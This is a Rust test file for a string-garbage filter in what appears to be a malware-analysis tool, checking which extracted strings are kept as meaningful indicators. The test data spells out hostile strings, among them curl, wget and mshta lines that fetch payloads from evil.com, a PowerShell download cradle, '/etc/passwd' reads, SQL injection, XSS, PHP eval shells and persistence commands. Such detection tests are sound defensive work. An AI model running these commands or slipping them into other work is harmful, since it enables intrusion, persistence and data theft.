use super::recognize::*;
use super::*;

#[test]
fn retains_short_environment_assignments() {
    assert!(!is_garbage("HISTSIZE=0"));
    assert!(!is_garbage("LANGUAGE=en_US"));
    let code = crate::types::StringContext {
        in_code_section: Some(true),
        ..crate::types::StringContext::empty()
    };
    assert!(is_garbage_with_context("HISTSIZE=0", &code));
}

#[test]
fn test_is_garbage_valid_strings() {
    // Valid strings should NOT be garbage
    assert!(!is_garbage("Hello World"));
    assert!(!is_garbage("go1.22.0"));
    assert!(!is_garbage("/usr/lib/go"));
    assert!(!is_garbage("runtime.memequal"));
    assert!(!is_garbage("SIGFPE: floating-point exception"));
    assert!(!is_garbage("Bool"));
    assert!(!is_garbage("Time"));
    assert!(!is_garbage("linux"));
    assert!(!is_garbage("amd64"));
    assert!(!is_garbage("https://example.com"));
    assert!(!is_garbage("ERROR_CODE_123"));
}

#[test]
fn test_is_garbage_hex_id_runs() {
    // UUIDs / Mythic payload_uuid
    assert!(!is_garbage("88a39a12-f279-4bb2-b102-1ee1157ad859"));
    assert!(!is_garbage("550e8400-e29b-41d4-a716-446655440000"));
    // Cryptographic hashes
    assert!(!is_garbage("d41d8cd98f00b204e9800998ecf8427e")); // MD5
    assert!(!is_garbage("da39a3ee5e6b4b0d3255bfef95601890afd80709")); // SHA1
    // MAC address
    assert!(!is_garbage("aa:bb:cc:dd:ee:ff"));
    assert!(!is_garbage("00:11:22:33:44:55"));
    // IPv6 fragment / full
    assert!(!is_garbage("2001:db8::1"));
    assert!(!is_garbage("fe80::1ff:fe23:4567:890a"));
    // GNU/ELF BuildID (hex blob)
    assert!(!is_garbage("26c9f26735a5f88a34ea361101b66971e5d74a29"));
    // Pure punctuation / too short / degenerate runs must NOT match
    assert!(!is_hex_id_run("--------", 8));
    assert!(!is_hex_id_run("::::::::", 8));
    assert!(!is_hex_id_run("12-34", 5));
    assert!(!is_hex_id_run("aaaaaaaa", 8)); // single distinct hex char
    assert!(!is_hex_id_run("12121212", 8)); // two distinct hex chars
    assert!(!is_hex_id_run("aa:bb:cc", 8)); // three distinct hex chars
}

#[test]
fn test_is_garbage_token_id_runs() {
    // Opaque API tokens / b64-shaped IDs (length ≥ 12, base64 alphabet)
    assert!(!is_garbage("AKIAIOSFODNN7EXAMPLE")); // AWS access key id shape
    assert!(!is_garbage("ghp_AbCd1234EfGh5678IjKl"));
    assert!(!is_garbage("se3A/A1YKZQ630wtjjvw")); // Mythic PSK fragment
    assert!(!is_garbage("1z2y3x4w5v6u")); // chaotic but diverse alphanumeric
    // Too short / not enough diversity / wrong alphabet
    assert!(!is_token_id_run("AKIA", 4));
    assert!(!is_token_id_run("aaaaaaaaaaaa", 12)); // 1 distinct
    assert!(!is_token_id_run("ababababababab", 14)); // 2 distinct
    assert!(!is_token_id_run("hello world!", 12)); // space + !
}

#[test]
fn test_is_garbage_jpeg_metadata() {
    // JPEG/image metadata strings should NOT be garbage
    assert!(!is_garbage("JFIF"));
    assert!(!is_garbage("Photoshop 3.0"));
    assert!(!is_garbage("8BIM")); // Photoshop resource marker
    assert!(!is_garbage("Exif"));
    assert!(!is_garbage("cph/3c13276u.tif"));
    assert!(!is_garbage("1998:12:15 13:03:34"));
    assert!(!is_garbage("Library of Congress"));
    // JPEG quantization table character sequence
    assert!(!is_garbage("%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz"));
}

#[test]
fn test_is_garbage_misaligned_go_reads() {
    // Misaligned Go data patterns should be garbage
    assert!(is_garbage("asL "));
    assert!(is_garbage("``L "));
    assert!(is_garbage("dL "));
    assert!(is_garbage("7aL "));
    assert!(is_garbage("`L "));
    assert!(is_garbage("D`L  "));
    assert!(is_garbage("~dL  "));
    assert!(is_garbage("#uL  "));
    assert!(is_garbage("gkL     @M"));
}

#[test]
fn test_is_garbage_short_binary_patterns() {
    // Short strings that look like misaligned binary data
    assert!(is_garbage("PuO#"));
    assert!(is_garbage("P9O"));
    assert!(is_garbage("8ZAj"));
    assert!(is_garbage("pIo2")); // mixed case + digit = garbage
    // Note: "PIO2" (3 upper + 1 digit) is now accepted as it matches
    // common patterns like "UTF8", "SHA1", "3DES" (file sigs, algorithms)
    assert!(!is_garbage("PIO2"));
    assert!(is_garbage("@E?"));
    assert!(is_garbage("P$O"));
    assert!(is_garbage("0Y/("));
    assert!(is_garbage("UoV#"));
    assert!(is_garbage("1j2`1r2l1128"));
    // JPEG/binary compressed data patterns
    assert!(is_garbage("Gi4r"));
    assert!(is_garbage("Uim0"));
    assert!(is_garbage("Ilu4")); // mixed case with digit
    // `cwZd` (lowercase + one uppercase + lowercase) used to be filtered
    // here, but it shares its shape with valid 4-char camelCase like
    // `iPad`, `hWnd`, `lpSz`. The looser short-camelCase rule now keeps
    // both — too brittle to distinguish without a whitelist.
    assert!(!is_garbage("cwZd"));
    // Consistent case alphanumeric patterns are accepted if they look like real identifiers
    assert!(!is_garbage("9N2A")); // all uppercase + digits, leading 9 = valid
    assert!(is_garbage("0YI0")); // digits at BOTH ends = garbage
    assert!(is_garbage("0GZF")); // single leading 0 = garbage
    assert!(is_garbage("1ABC")); // single leading 1 = garbage
    assert!(is_garbage("8oz1")); // mixed case (upper and lower) = garbage
    // `gnzUrs` (one upper mid-string) used to be filtered here, but the
    // same shape covers real camelCase identifiers like `getTime` and
    // `setLine`. The looser identifier-shape rule now keeps both.
    assert!(!is_garbage("gnzUrs"));
    assert!(!is_garbage("getTime"));
    // Note: "3OEP" looks like "8BIM" (digit + uppercase), can't distinguish without whitelist
    // Short strings with internal spaces
    assert!(is_garbage("5c 9"));
    assert!(is_garbage("VW N"));
    // But all-uppercase, all-lowercase, or all-numeric are OK
    assert!(!is_garbage("PFO"));
    assert!(!is_garbage("API"));
    assert!(!is_garbage("foo"));
    assert!(!is_garbage("1234"));
}

#[test]
fn test_is_garbage_short_nonalpha() {
    // Short strings with mostly non-alphanumeric
    assert!(is_garbage("@#$%"));
    assert!(is_garbage("!!!"));
    assert!(is_garbage("   "));
    assert!(is_garbage(""));
}

#[test]
fn test_is_garbage_repeated_chars() {
    // Single repeated characters
    assert!(is_garbage("aaaa"));
    assert!(is_garbage("...."));
    assert!(is_garbage("----"));
}

#[test]
fn test_is_garbage_unicode_endings() {
    // Short strings with non-ASCII unicode at the end
    assert!(is_garbage("333333ӿ"));
    assert!(is_garbage("abcӿ"));
}

#[test]
fn test_is_garbage_control_chars() {
    // Strings with control characters
    assert!(is_garbage("ab\x00cd"));
    assert!(is_garbage("\x01\x02\x03"));
}

#[test]
fn test_is_garbage_single_char() {
    assert!(is_garbage("a"));
    assert!(is_garbage("X"));
    assert!(is_garbage("1"));
}

#[test]
fn test_is_garbage_alternating_pattern() {
    // Alternating digit/non-hex-letter chaos with no other signal
    assert!(is_garbage("1z2y3x4w5v"));
    // Pure-hex run of the same shape is kept — could be a short
    // hash fragment, build ID, or other identifier (see
    // is_hex_id_run / test_is_garbage_hex_id_runs).
    assert!(!is_garbage("1a2b3c4d5e"));
}

#[test]
fn test_is_garbage_low_alphanum_ratio() {
    // Less than 30% alphanumeric for strings > 6 chars
    assert!(is_garbage("....!!!!"));
}

#[test]
fn test_is_garbage_unbalanced_parens() {
    assert!(is_garbage("ab(cd"));
    assert!(is_garbage("ab[cd"));
}

#[test]
fn test_is_garbage_single_quote() {
    assert!(is_garbage("ab'cd"));
}

#[test]
fn test_is_garbage_trailing_newline_ok() {
    // Trailing newline should not trigger control char detection
    assert!(!is_garbage("hello world\n"));
}

#[test]
fn test_is_garbage_pascal_case_identifiers() {
    // PascalCase / camelCase symbol names with frequent Upper↔Lower
    // transitions are valid identifiers and must not be flagged as chaotic.
    // Regression: pre-fix, the binary at SHA
    // 515638dc...e7.exe (a .NET PE with `CallByName` at offset 0x46fd) was
    // missing this symbol because the chaos detector saw avg run length
    // 1.67 over 10 chars and bailed.
    for s in [
        "CallByName",
        "FooBarBaz",
        "PtrToThis",
        "SetIterKey",
        "FileSizeLow",
        "LowDateTime",
        "MaxSockAddr",
        "ReturnIsPtr",
        "GetHashCode",
        "AddRange",
        "ToString",
    ] {
        assert!(!is_garbage(s), "{s:?} is a valid PascalCase identifier");
    }
}

#[test]
fn test_is_garbage_alternating_case_letters_kept() {
    // Long pure-ASCII letter strings — even with frequent case alternation —
    // are likely meaningful (identifiers, obfuscated text, words).
    for s in ["AbCdEfGh", "PaSsWoRd", "TheQuickBrownFox", "AaBbCcDdEe"] {
        assert!(!is_garbage(s), "{s:?} is a long letter string");
    }
}

#[test]
fn test_is_garbage_leading_tab_trimmed() {
    // A leading tab on an otherwise valid identifier must not poison
    // the control-character check. Real Go pclntab entries surface
    // identifiers prefixed with a `\t` byte. (Leading literal spaces
    // are still treated as garbage by the short-string heuristic at
    // `is_fast_path_garbage` — that's separate and intentional.)
    assert!(!is_garbage("\tPtrToThis"));
    assert!(!is_garbage("\tCallByName"));
    assert!(!is_garbage("\tFieldByName"));
}

#[test]
fn test_is_garbage_camel_case_garbage_still_rejected() {
    // Alternation alone is not enough — without any ≥2-char lowercase run
    // and at <7 chars, mixed-case strings should still be considered garbage.
    assert!(is_garbage("AaBbCc"));
}

#[test]
fn test_is_garbage_crypto_algorithm_names() {
    // Crypto / hash / type names with digits used to be killed by the
    // MIXED_CASE_DIGIT range filter (5–10 chars + upper + lower + digit).
    // The looser identifier-shape rule keeps them.
    for s in [
        "MD5Hash",
        "SHA256Init",
        "Curve25519",
        "Ed25519",
        "Argon2",
        "ToInt32",
        "Int64",
        "BCrypt",
    ] {
        assert!(!is_garbage(s), "{s:?} is a valid identifier with digits");
    }
}

#[test]
fn test_is_garbage_file_globs() {
    // File-glob patterns are high-value malware indicators and must
    // survive the short-string noise-punctuation filter.
    for s in ["*.exe", "*.dll", "*.bin", "*.tmp", "*.log", "*.so"] {
        assert!(!is_garbage(s), "{s:?} is a valid file glob");
    }
    // Sanity: the bare extension form was already accepted.
    for s in [".exe", ".dll", ".so", "exe", "dll"] {
        assert!(!is_garbage(s));
    }
}

#[test]
fn test_is_garbage_four_char_camelcase_kept() {
    // 4-char camelCase: brand names, Hungarian notation, abbreviated
    // identifiers — high signal for security analysts (`hWnd` is a
    // ubiquitous Win32 type; `iPad`, `iMac` are Apple device IDs).
    for s in ["iPad", "iMac", "iPod", "hWnd", "lpSz", "dwId"] {
        assert!(!is_garbage(s), "{s:?} is a valid 4-char camelCase");
    }
}

#[test]
fn test_is_garbage_short_function_calls_kept() {
    // `Run()`, `F(x)`, `fn()` — short function-call shapes are
    // meaningful code fragments, not noise.
    for s in ["Run()", "fn()", "F(x)", "Init()", "Stop()"] {
        assert!(!is_garbage(s), "{s:?} is a valid function call");
    }
}

#[test]
fn test_is_garbage_multi_word_fragments_kept() {
    // Multi-word fragments from disassembly output, formatted logs, etc.
    // The space-separated structure is meaningful even when individual
    // tokens look like noise (single-letter, all-caps, etc.).
    for s in [
        "MOV EAX, 0",
        "JMP +5",
        "SUB ESP, 8",
        "PUSH EAX",
        "LEA RAX, [RBX]",
    ] {
        assert!(!is_garbage(s), "{s:?} is a valid asm fragment");
    }
}

#[test]
fn test_is_garbage_multi_word_noise_still_rejected() {
    // A single space inside otherwise-noisy bytes shouldn't save them.
    // The exemption requires <=1 noise-punct char and all-ASCII.
    assert!(is_garbage("ZFI7% eE;*\\Y"));
    assert!(is_garbage("`C dJe`eN{Û"));
}

#[test]
fn test_is_garbage_short_camelcase_kept() {
    // 5+ char identifier-shaped names are kept — covers `iPad`-style
    // abbreviated identifiers, Hungarian notation like `hModule`, and
    // brand-shaped strings like `iOSv2`.
    for s in ["myVal", "getId", "iOSv2", "setLen"] {
        assert!(!is_garbage(s));
    }
    // 4-char binary noise with a digit or uppercase prefix is still
    // rejected. (`cwZd` was previously here but is now kept because
    // it has the same lowercase-first camelCase shape as `iPad`.)
    for s in ["Ilu4", "Uim0", "Gi4r", "8oz1"] {
        assert!(is_garbage(s));
    }
}

#[test]
fn test_is_garbage_short_strings_with_dots() {
    // Short strings with dots should not be automatically marked as garbage
    // These are common in filenames and section names
    assert!(!is_garbage("d.exe"), "d.exe should not be garbage");
    assert!(!is_garbage(".blah"), ".blah should not be garbage");
    assert!(!is_garbage("a.out"), "a.out should not be garbage");
    assert!(!is_garbage("lib.so"), "lib.so should not be garbage");

    // Section names specifically (starts with dot)
    assert!(!is_garbage(".text"), ".text should not be garbage");
    assert!(!is_garbage(".data"), ".data should not be garbage");
    assert!(!is_garbage(".bss"), ".bss should not be garbage");
}

#[test]
fn test_is_garbage_base64_strings() {
    // Base64 strings should NOT be garbage
    assert!(!is_garbage("VGhpcyBpcyBhIHNlY3JldCBtZXNzYWdl"));
    assert!(!is_garbage("SGVsbG8gV29ybGQh"));
    assert!(!is_garbage("YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXo="));
}

#[test]
fn test_is_garbage_obfuscated_javascript() {
    // Obfuscated JavaScript with hex identifiers should NOT be garbage
    // This is common in malware and should be preserved for analysis
    let test_cases = vec![
        ("const _0x1c1000=_0x230d;", "simple const assignment"),
        (
            "const _0x1c1000=_0x230d;function _0x230d(_0x996a22,_0x589a56){const _0x11053a=_0x1105();return _0x230d=function(_0x2",
            "full obfuscated code",
        ),
        (
            "function _0x230d(_0x996a22,_0x589a56)",
            "function declaration",
        ),
        ("const _0x1c1000=_0x230d", "const without semicolon"),
        ("_0x230d(_0x996a22,_0x589a56)", "function call"),
        ("return _0x230d", "return statement"),
        ("var _0x4a5b=['base64','encode','decode']", "var with array"),
        ("if(_0x1a2b3c===_0x4d5e6f)", "if statement"),
        ("_0x123abc[_0x456def(0x0)]", "array access"),
    ];

    for (s, desc) in test_cases {
        let result = is_garbage(s);
        assert!(
            !result,
            "Obfuscated JavaScript should NOT be garbage: {desc} - got is_garbage={result}"
        );
    }
}

#[test]
fn test_is_garbage_shell_shebangs_and_options() {
    // Shebang lines and shell command options should NOT be garbage
    assert!(!is_garbage("#!/bin/sh -eux -o p"));
    assert!(!is_garbage("#!/bin/bash"));
    assert!(!is_garbage("#!/usr/bin/env python3"));
    assert!(!is_garbage("sh -c 'command'"));
    assert!(!is_garbage("bash -eux"));
    assert!(!is_garbage("/bin/sh -e"));
}

#[test]
fn test_is_garbage_obfuscated_python() {
    // Obfuscated Python with mangled identifiers should NOT be garbage
    assert!(!is_garbage("def llIIlIlllllIIlllII(lllIllllIIIllIllII):"));
    assert!(!is_garbage(
        "lllllIIIIlllllIlII=IIllIlI.IllIllIllIllllIIlIIlIllIl();llIIIIIllllIllIlII=lilIIlI.IllIllIllIllllIIlIIlIllIl();llIlIIIIIIIIllIIlI=lIllIlIlIIIlIIIlII.IllIIlIIlllIIIIlIlIIllIII(lllllIIIIlllllIlII,llIIIIIllllIllIlII)"
    ));
    assert!(!is_garbage(
        "return llIIIIIlIllIllIlIl(lllIllllIIIllIllII.IllllIIllllIIIIIIlIIlIIII(llIlIIIIIIIIllIIlI)).IlIlIlIlIIIIlIllIllllllII()"
    ));
    assert!(!is_garbage(
        "lIlIlIlIIIlIllllll(IIlIlIIIlIIIIlIIIl(IllIllIlIIIlllllII(llIIlIlllllIIlllII(lIlllllIl)),llIIlIlllllIIlllII(lIIIIIlI))(lIllIlIlIIIlIIIlII.IlIIIllIIIIlllIIIlllIlIll(lIlIIIlIlIIIlI.replace"
    ));
}

#[test]
fn test_is_garbage_malware_iocs() {
    // IOCs commonly found in malware should NOT be garbage

    // MAC addresses
    assert!(!is_garbage("00:1A:2B:3C:4D:5E"), "MAC address colon format");
    assert!(!is_garbage("00-1A-2B-3C-4D-5E"), "MAC address dash format");
    assert!(!is_garbage("001A.2B3C.4D5E"), "MAC address Cisco format");

    // IPv6 addresses
    assert!(
        !is_garbage("2001:0db8:85a3:0000:0000:8a2e:0370:7334"),
        "IPv6 full"
    );
    assert!(
        !is_garbage("2001:db8:85a3::8a2e:370:7334"),
        "IPv6 compressed"
    );
    assert!(!is_garbage("::1"), "IPv6 loopback");
    assert!(!is_garbage("fe80::1"), "IPv6 link-local");
    assert!(!is_garbage("2001:db8::192.0.2.1"), "IPv6 with IPv4");

    // Crypto keys and hashes (RC4, AES, etc.)
    assert!(!is_garbage("5f4dcc3b5aa765d61d8327deb882cf99"), "MD5 hash");
    assert!(
        !is_garbage("2fd4e1c67a2d28fced849ee1bb76e7391b93eb12"),
        "SHA1 hash"
    );
    assert!(
        !is_garbage("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"),
        "SHA256 hash"
    );
    assert!(!is_garbage("DEADBEEF1234567890ABCDEF"), "Hex key");

    // Comma-delimited locale/language values
    assert!(!is_garbage("en_US,en,en_GB,fr_FR,de_DE"), "Locale list");
    assert!(!is_garbage("en-US,zh-CN,ja-JP,ko-KR"), "Language codes");
    assert!(
        !is_garbage("UTF-8,ISO-8859-1,ASCII,UTF-16"),
        "Encoding list"
    );

    // Obfuscated code patterns - C
    assert!(
        !is_garbage("char *p=((char*)0x41414141);"),
        "C pointer obfuscation"
    );
    assert!(!is_garbage("__attribute__((constructor))"), "C attribute");
    assert!(!is_garbage("#define XOR(a,b) ((a)^(b))"), "C macro");

    // Obfuscated code patterns - PHP
    assert!(
        !is_garbage("eval(base64_decode('SGVsbG8='));"),
        "PHP eval base64"
    );
    assert!(!is_garbage("${'GLOBALS'}['_GET']"), "PHP dynamic globals");
    assert!(
        !is_garbage("${$_GET['x']}($_POST['y']);"),
        "PHP variable variables"
    );
    assert!(
        !is_garbage("preg_replace('/e/e','system($_GET[c])','');"),
        "PHP preg_replace /e"
    );

    // Obfuscated code patterns - Perl
    assert!(
        !is_garbage("eval(pack('H*','48656c6c6f'));"),
        "Perl eval pack"
    );
    assert!(!is_garbage("system($ARGV[0]);"), "Perl system call");
    assert!(!is_garbage("open(F,'|/bin/sh');"), "Perl pipe open");

    // Obfuscated code patterns - Shell
    assert!(
        !is_garbage("eval $(echo SGVsbG8K|base64 -d)"),
        "Shell eval base64"
    );
    assert!(
        !is_garbage("sh -c 'curl http://evil.com|sh'"),
        "Shell curl pipe"
    );
    assert!(
        !is_garbage("${IFS}cat${IFS}/etc/passwd"),
        "Shell IFS obfuscation"
    );

    // Network indicators
    assert!(!is_garbage("Host: evil.com:8080"), "HTTP host header");
    assert!(!is_garbage("User-Agent: Mozilla/5.0"), "HTTP user agent");
    assert!(
        !is_garbage("Content-Type: application/x-www-form-urlencoded"),
        "HTTP content type"
    );
}

#[test]
fn test_is_garbage_non_ascii_strings() {
    // Strings with excessive non-ASCII characters should be garbage
    let test_cases = vec![
        ("/º ¸`¨wl½¶ zmNy", "Path with non-ASCII chars"),
        ("cyl}´á!Qñ#´{ûNy1", "Random with non-ASCII chars"),
        ("CMQpç+9¥g½Ñãiq¸¹:î¦»ölX²", "Long string with non-ASCII"),
        ("?ÔTlbxbµ¥äèêæ", "Short string with non-ASCII"),
        ("ÉBXAÕhDqÌuyóÉµ", "Mixed with non-ASCII"),
        ("ùÉÜÔrzAyÀµCLYìÐ", "Random non-ASCII"),
        ("ë9[R.-XK3`o3ú¼ÁOY", "Special chars with non-ASCII"),
        ("rL*>@«ßtS·` tNV°}*¸", "Symbols with non-ASCII"),
        ("Yapt3OJÃÚ'µ£¦¯È", "Mixed case with non-ASCII"),
        ("`C dJe`eN{Û", "Backtick with non-ASCII"),
    ];

    for (s, desc) in test_cases {
        assert!(is_garbage(s), "{desc}: {s:?}");
    }
}

#[test]
fn test_is_garbage_literal_escape_sequences() {
    // Strings with literal \x escape sequences (not in code context) are garbage
    assert!(
        is_garbage("RFXA-\\xU*^$U"),
        "Literal \\x escape outside code"
    );
    assert!(is_garbage("foo\\x41bar"), "Literal \\x in string");

    // But these should NOT be garbage (code context)
    assert!(
        !is_garbage("print \"\\x41\\x42\\x43\""),
        "Code with escape sequences"
    );
    assert!(
        !is_garbage("echo '\\x48\\x65\\x6c\\x6c\\x6f'"),
        "Shell with escapes"
    );
}

#[test]
fn test_is_garbage_ransomware_and_ctf_iocs() {
    // IOCs commonly found in ransomware and CTF challenges should NOT be garbage.
    for (s, what) in [
        // Cryptocurrency wallet addresses
        (
            "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
            "Bitcoin address (legacy)",
        ),
        (
            "3J98t1WpEZ73CNmYviecrnyiWrnqRhWNLy",
            "Bitcoin address (P2SH)",
        ),
        (
            "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq",
            "Bitcoin address (bech32)",
        ),
        (
            "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb",
            "Ethereum address",
        ),
        (
            "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A",
            "Monero address",
        ),
        ("LdP8Qox1VAhCzLJNqrqPRHWXpnRAjRUa4L", "Litecoin address"),
        ("DH5yaieqoZN36fDVciNyRueRGvGLR3mr7L", "Dogecoin address"),
        // Cryptocurrency mining pools and stratum URLs
        ("pool.minexmr.com:4444", "Monero mining pool"),
        ("xmr-eu1.nanopool.org:14444", "Nanopool XMR"),
        ("eth-us-east1.nanopool.org:9999", "Nanopool ETH"),
        ("stratum+tcp://pool.supportxmr.com:3333", "Stratum URL"),
        ("stratum+ssl://xmr.pool.minergate.com:45700", "Stratum SSL"),
        // Cryptocurrency miner software names and commands
        ("xmrig", "XMRig miner"),
        ("xmr-stak", "XMR-Stak miner"),
        ("cpuminer-multi", "CPU miner"),
        ("ccminer", "CUDA miner"),
        ("ethminer", "Ethereum miner"),
        ("PhoenixMiner", "Phoenix miner"),
        ("t-rex", "T-Rex miner"),
        ("--donate-level=1", "Miner donate flag"),
        ("-o pool.minexmr.com:4444 -u", "Miner command line"),
        ("--algo=cryptonight", "Mining algorithm"),
        ("--cuda-devices=0,1", "GPU device selection"),
        // Tor/Onion URLs (common in ransomware)
        ("http://thehiddenwiki.onion", "Onion URL HTTP"),
        ("https://3g2upl4pq6kufc4m.onion", "Onion URL DuckDuckGo"),
        ("ransomware2x4ytmz.onion", "Onion domain only"),
        // CTF flag formats
        ("CTF{th1s_1s_4_fl4g}", "CTF flag format"),
        ("flag{base64_encoded_secret}", "flag{{}} format"),
        ("picoCTF{b1n4ry_3xpl01t4t10n}", "picoCTF format"),
        ("HTB{h4ck_th3_b0x}", "HackTheBox format"),
        ("FLAG{SQL_1nj3ct10n_pwn3d}", "FLAG{{}} format"),
        // Email addresses (used in ransomware contact)
        ("decrypt@protonmail.com", "Ransomware email"),
        ("recover.files@tutanota.com", "Recovery email"),
        ("unlock_data@cock.li", "Contact email"),
        // Ransomware file extensions
        (".locked", "Locked extension"),
        (".encrypted", "Encrypted extension"),
        (".crypted", "Crypted extension"),
        (".wannacry", "WannaCry extension"),
        (".ryuk", "Ryuk extension"),
        (".locky", "Locky extension"),
        // Mutex/synchronization names (often weird strings)
        ("Global\\MsWinZonesCacheCounterMutexA", "Windows mutex"),
        ("{8F6F0AC4-B9A1-45fd-A8CF-72997C3991B}", "GUID mutex"),
        // Windows registry paths
        (
            "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "Registry run key",
        ),
        (
            "HKCU\\Software\\Classes\\exefile\\shell\\open\\command",
            "Registry exefile",
        ),
        // SQL injection payloads (CTF/pentesting)
        ("' OR '1'='1", "SQL injection basic"),
        ("admin'--", "SQL comment injection"),
        ("1' UNION SELECT NULL,NULL,NULL--", "SQL union injection"),
        // XSS payloads
        ("<script>alert(1)</script>", "XSS basic"),
        ("<img src=x onerror=alert(1)>", "XSS img tag"),
        (
            "javascript:alert(document.cookie)",
            "XSS javascript protocol",
        ),
        // Command injection patterns
        ("; cat /etc/passwd", "Command injection semicolon"),
        ("| whoami", "Command injection pipe"),
        ("`id`", "Command injection backticks"),
        ("$(wget http://evil.com/shell.sh)", "Command injection wget"),
        // Persistence mechanisms
        (
            "schtasks /create /tn \"WindowsUpdate\" /tr",
            "Scheduled task",
        ),
        ("net user hacker password123 /add", "User creation"),
        (
            "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "Registry persistence",
        ),
        // Common malware/CTF tools signatures
        ("powershell -enc", "PowerShell encoded"),
        (
            "IEX(New-Object Net.WebClient).DownloadString",
            "PowerShell download",
        ),
        ("certutil -urlcache -split -f", "Certutil download"),
        ("mshta http://evil.com/payload.hta", "Mshta execution"),
        // JWT tokens (common in web CTFs)
        (
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
            "JWT token",
        ),
        // RSA/PEM keys (truncated for test)
        ("-----BEGIN PUBLIC KEY-----", "PEM header"),
        ("-----END PRIVATE KEY-----", "PEM footer"),
        (
            "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA",
            "RSA key data",
        ),
        // Ransom note patterns
        ("YOUR FILES HAVE BEEN ENCRYPTED", "Ransom message"),
        ("Send $500 in Bitcoin to", "Ransom demand"),
        ("DECRYPT-INSTRUCTIONS.txt", "Ransom note filename"),
        ("HOW-TO-DECRYPT.html", "Decrypt instructions"),
        // LDAP/AD paths
        ("LDAP://CN=Users,DC=domain,DC=com", "LDAP path"),
        (
            "CN=Administrator,CN=Users,DC=corp,DC=local",
            "AD distinguished name",
        ),
        // API keys/secrets patterns (should preserve structure even if fake)
        ("AKIA0123456789ABCDEF", "AWS access key format"),
        (
            "ghp_0123456789abcdefghijklmnopqrstuv",
            "GitHub token format",
        ),
        ("sk_live_0123456789abcdefghijklmn", "Stripe secret key"),
    ] {
        assert!(!is_garbage(s), "{what}: {s}");
    }
}

#[test]
fn test_is_garbage_xor_malware_samples() {
    // Real garbage strings from XOR-decoded malware (brew_agent sample)
    // These have chaotic character class alternation and should be filtered
    // Note: Some strings with specific patterns (e.g., short with limited special chars)
    // may not be caught by all heuristics, but the majority should be filtered
    let garbage_strings = vec![
        "v*\\^R--E:y4)@O",
        "ZFI7% eE;*\\Y",
        "Z(9uE(/S_B>7/c",
        "#LUU2!FN}v.VDH!#T:y40]P\"L,JSy',E[H\"5/c",
        "#L_G90_<\"J8KFy!!SCy>+FH}v.LXJ",
        "\\?UuC%3YeO9,[<\"J8KFy!!SCy' ]Z",
        "H>@uO*)T:y40]P\"L,JSy4%R\\I%(/c",
        "G$M*y'5RVy2$\\E\"Y(KLI6- eE\"7Cc",
        "P_T1*]Q}v.LXJ",
        "F?T*y'5RVy2$\\E\"Z(MEV0@",
        "IC#*_H}v.LXJ",
        "\\?UuU()SNy17JY\"H!U*y!8IN&",
        "[(\\uG(, eC/,[<\"O.UEU!@",
        "Z(9u@'/PC@>)J<\"O+U_U,@",
        "\\>Q*y\"'ENUW",
        "\\A21\\<\"O!VIMD",
        "\\J8&D<\"O\"IOHD",
        "F.R*y\"/P_HW",
        "[(\\*y\"2EUV2+/c",
        "\\R2)C<\"O9\\FJ+@",
        "@9\\*y#%T_H!Ep[",
        "]C# AJ}v*\\^N+3TTG: /c",
        "^OR,/SNH6(J<\"N(MZQ1)D:y0",
    ];

    for s in &garbage_strings {
        assert!(
            is_garbage(s),
            "XOR garbage string should be filtered: {s:?}"
        );
    }
}

// ===== Telegram bot token predicate =====

#[test]
fn test_is_telegram_bot_token_positive() {
    // DPRK Teams (2026.04) sample.
    let t = "8520232238:AAF6xeNiv-OKpAPrnRmv7AsjmJAmkRjf0I4";
    assert!(is_telegram_bot_token(t, t.len()));

    // Canonical bot token from Telegram docs.
    let t = "110201543:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsaw";
    assert!(is_telegram_bot_token(t, t.len()));

    // Underscores in body.
    let t = "6789012345:ABC_def123GHI_jklMNO-pqrSTU_vwxYZ01";
    assert!(is_telegram_bot_token(t, t.len()));

    // Whole token kept out of the chaos filter.
    assert!(!is_garbage(
        "8520232238:AAF6xeNiv-OKpAPrnRmv7AsjmJAmkRjf0I4"
    ));
}

#[test]
fn test_is_telegram_bot_token_negative() {
    // No colon.
    let t = "8520232238AAF6xeNivOKpAPrnRmv7AsjmJAmkRjf0I4";
    assert!(!is_telegram_bot_token(t, t.len()));

    // bot_id too short (7 digits).
    let t = "1234567:AAF6xeNiv-OKpAPrnRmv7AsjmJAmkRjf0I4";
    assert!(!is_telegram_bot_token(t, t.len()));

    // bot_id contains letters.
    let t = "bot1234567:AAF6xeNiv-OKpAPrnRmv7AsjmJAmkRjf0I4";
    assert!(!is_telegram_bot_token(t, t.len()));

    // body too short.
    let t = "8520232238:short";
    assert!(!is_telegram_bot_token(t, t.len()));

    // body contains invalid chars (dot, slash).
    let t = "8520232238:AAF6xeNiv.OKpAPrnRmv7AsjmJAmkRjf0I4";
    assert!(!is_telegram_bot_token(t, t.len()));
    let t = "8520232238:AAF6xeNiv/OKpAPrnRmv7AsjmJAmkRjf0I4";
    assert!(!is_telegram_bot_token(t, t.len()));
}

// ===== Swift mangled symbol predicate =====

#[test]
fn test_is_swift_mangled_symbol_positive() {
    // _TtC class metadata (the DPRK Teams sample).
    let s = "_TtC7TeamAppP33_464D6157E8D96D7B7ECE5C61C5669F7019ResourceBundleClass";
    assert!(is_swift_mangled_symbol(s, s.len()));

    // _$s Swift 5 stable ABI.
    let s = "_$sSo17OS_dispatch_queueC8DispatchE4mainABvgZ";
    assert!(is_swift_mangled_symbol(s, s.len()));

    // $s prefix (no leading underscore).
    let s = "$s10Foundation4DataV5bytesAC10ByteBufferVyXlSgvg";
    assert!(is_swift_mangled_symbol(s, s.len()));

    // _T0 Swift 4 ABI.
    let s = "_T010Foundation4DataVMa";
